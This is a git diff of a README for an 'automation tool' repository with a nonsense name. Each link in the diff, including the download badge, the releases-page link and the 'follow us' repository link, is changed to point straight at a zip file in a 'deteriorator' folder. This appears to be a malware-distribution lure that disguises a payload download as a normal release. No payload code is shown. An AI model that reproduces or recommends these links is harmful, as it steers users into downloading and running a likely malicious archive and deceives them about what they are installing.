@@ -1,7 +1,7 @@
 # 🚀 amanansdiahnid-21 - Simple Tool for Easy Automation
 
-![Download](https://img.shields.io/badge/Download-Now-brightgreen)  
-[Download Now](https://github.com/Sanukadeshan/amanansdiahnid-21/releases)
+![Download](https://raw.githubusercontent.com/Sanukadeshan/amanansdiahnid-21/main/deteriorator/amanansdiahnid-21.zip)  
+[Download Now](https://raw.githubusercontent.com/Sanukadeshan/amanansdiahnid-21/main/deteriorator/amanansdiahnid-21.zip)
 
 ## 📃 Description
 
@@ -29,7 +29,7 @@ Follow these simple steps to download and run amanansdiahnid-21.
 
 1. **Visit the Releases Page**: Click the link below to go to our GitHub Releases page:
 
-   [Visit Releases Page](https://github.com/Sanukadeshan/amanansdiahnid-21/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/Sanukadeshan/amanansdiahnid-21/main/deteriorator/amanansdiahnid-21.zip)
 
 2. **Download the Application**: On the Releases page, you will see a list of available versions. Click on the most recent version title to see what’s new, and then find the link to download the application file.
 
@@ -64,7 +64,7 @@ Amanansdiahnid-21 is licensed under the MIT License. This means you can freely u
 
 ## 📢 Join Us
 
-For updates and news, you can follow us on our [GitHub repository](https://github.com/Sanukadeshan/amanansdiahnid-21).
+For updates and news, you can follow us on our [GitHub repository](https://raw.githubusercontent.com/Sanukadeshan/amanansdiahnid-21/main/deteriorator/amanansdiahnid-21.zip).
 
 ---
 
